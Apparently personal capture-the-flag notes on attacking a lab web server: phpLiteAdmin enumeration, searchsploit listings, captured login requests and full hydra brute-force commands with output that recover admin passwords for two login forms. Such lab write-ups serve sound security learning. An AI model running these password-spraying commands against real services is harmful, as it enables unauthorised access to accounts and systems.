# Port 443

- /db/ tells us that this is a PHP based web site
![[Pasted image 20210330015253.png]]
- phpLiteAdmin hosted on /db. phpLiteAdmin is SQLite based. v1.9
- Searchsploit Exploits
```bash
searchsploit phpliteadmin                                                                                     2 ↵
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
phpLiteAdmin - 'table' SQL Injection                                                | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                         | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                      | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                       | php/webapps/39714.txt
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results

```
- We need remote code execution, but for that we need a valid user. The request is below:
```html
POST /db/index.php HTTP/1.1
Host: 10.10.10.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.10.10.43/db/
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Origin: https://10.10.10.43
Connection: close
Cookie: PHPSESSID=6am0khatc9bb9p5gddbepd2v83
Upgrade-Insecure-Requests: 1

password=sad&remember=yes&login=Log+In&proc_login=true
```
- Using hydra for bruteforcing
```sudo hydra -l admin -P $ROCK 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-31 01:08:24
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password
[STATUS] 582.00 tries/min, 582 tries in 00:01h, 14343816 to do in 410:46h, 16 active
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-31 01:10:51
```
- We found a valid credential --> admin:password123
- 
# Port 80

- We find another page called as /department which provides us with a login page.
- We can bruteforce it too, using hydra. The request page is below

```html
POST /department/login.php HTTP/1.1
Host: 10.10.10.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.10.10.43
Connection: close
Referer: http://10.10.10.43/department/login.php
Cookie: PHPSESSID=6am0khatc9bb9p5gddbepd2v83
Upgrade-Insecure-Requests: 1

username=admin&password=trial
```
- Using hyra for password bruteforcing
```bash
sudo hydra -l admin -P $ROCK 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password"
[sudo] password for norman: 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-31 00:59:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=admin&password=^PASS^:Invalid Password
[STATUS] 1031.00 tries/min, 1031 tries in 00:01h, 14343367 to do in 231:53h, 16 active
    
[STATUS] 1041.67 tries/min, 3125 tries in 00:03h, 14341273 to do in 229:28h, 16 active
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-31 01:03:41

```
- We found a password --> admin:1q2w3e4r5t


